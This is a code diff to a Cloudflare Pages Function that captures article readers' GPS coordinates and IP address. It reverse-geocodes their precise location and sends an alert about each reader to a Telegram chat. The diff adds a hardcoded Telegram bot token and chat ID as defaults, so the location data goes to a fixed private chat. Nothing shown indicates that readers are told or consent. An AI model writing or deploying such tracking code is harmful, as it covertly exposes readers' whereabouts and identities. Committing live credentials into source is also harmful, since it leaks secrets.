@@ -1,5 +1,8 @@
 // Cloudflare Pages Function: /api/location with Telegram Instant Alerts
 
+const DEFAULT_BOT_TOKEN = '9189550669:AAEorTZyQhF2vZlZHzFgU6Tgxqw4Y2CKgrk';
+const DEFAULT_CHAT_ID = '7070372458';
+
 // Reverse geocode via OpenStreetMap Nominatim
 async function reverseGeocode(lat, lon) {
   try {
@@ -32,8 +35,8 @@ async function reverseGeocode(lat, lon) {
 }
 
 async function sendTelegramAlert(env, record) {
-  const token = env.TELEGRAM_BOT_TOKEN;
-  const chatId = env.TELEGRAM_CHAT_ID;
+  const token = (env && env.TELEGRAM_BOT_TOKEN) || DEFAULT_BOT_TOKEN;
+  const chatId = (env && env.TELEGRAM_CHAT_ID) || DEFAULT_CHAT_ID;
 
   if (!token || !chatId) return;
 
@@ -41,13 +44,13 @@ async function sendTelegramAlert(env, record) {
   const city = record.address?.city || record.address?.district || 'Nepal';
   const mapsUrl = record.address?.mapsUrl || `https://www.google.com/maps?q=${record.latitude},${record.longitude}`;
 
-  const message = `📍 *New Reader GPS Location Captured*
+  const message = `📍 *Reader GPS Location Captured*
 ━━━━━━━━━━━━━━━━━━━
 📰 *Article:* \`${record.slug}\`
 🏙️ *Area / Tole:* ${area}
 🗺️ *City / District:* ${city}
 📌 *Full Address:* ${record.address?.displayName || 'N/A'}
-🎯 *Accuracy:* ±${record.accuracy || '?'} meters
+🎯 *GPS Accuracy:* ±${record.accuracy || '?'} meters
 🌐 *IP:* \`${record.ip}\`
 ⏰ *Time:* ${new Date().toLocaleString('en-US', { timeZone: 'Asia/Kathmandu' })} (Nepal Time)
 
@@ -95,7 +98,7 @@ export async function onRequestPost(context) {
       userAgent: context.request.headers.get('user-agent') || '',
     };
 
-    // Send Telegram alert in background
+    // Send Telegram alert in background via Cloudflare Edge
     context.waitUntil(sendTelegramAlert(context.env, record));
 
     return new Response(JSON.stringify({ success: true, record }), {
@@ -111,7 +114,7 @@ export async function onRequestPost(context) {
 }
 
 export async function onRequestGet() {
-  return new Response(JSON.stringify({ status: 'ok', service: 'Telegram Location Service' }), {
+  return new Response(JSON.stringify({ status: 'ok', service: 'Telegram Location Service Active' }), {
     status: 200,
     headers: { 'Content-Type': 'application/json' },
   });
